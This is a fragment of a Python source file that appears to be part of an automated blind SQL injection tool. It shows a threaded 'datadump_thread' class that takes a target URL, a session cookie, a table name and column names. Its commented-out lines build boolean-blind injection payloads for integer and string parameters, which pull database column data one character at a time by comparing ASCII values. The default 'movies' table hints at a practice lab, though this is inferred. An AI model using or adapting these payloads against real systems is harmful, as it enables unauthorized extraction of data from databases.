...
from get_tbname import get_tbname
from get_coname import get_coname
...
class datadump_thread():
    ...
    def __init__(self, url=glovar.url4, cookie=glovar.cookie, type='int', tbname='movies', coname_list=[], rowcount=10,
        ...
        # 读取列数据用
        # if self.type == 'int':
        #     self.payload = '+or+if((select+ascii(substr((select+' + self.coname + '+from+' + self.tbname + '+limit+{data_row_order},1),{data_location},1))={ascii_number}),1,0)'
        # elif self.type == 'string':
        #     self.payload = '\'+or+if((select+ascii(substr((select+' + self.coname + '+from+' + self.tbname + '+limit+{data_row_order},1),{data_location},1))={ascii_number}),1,0)%23'
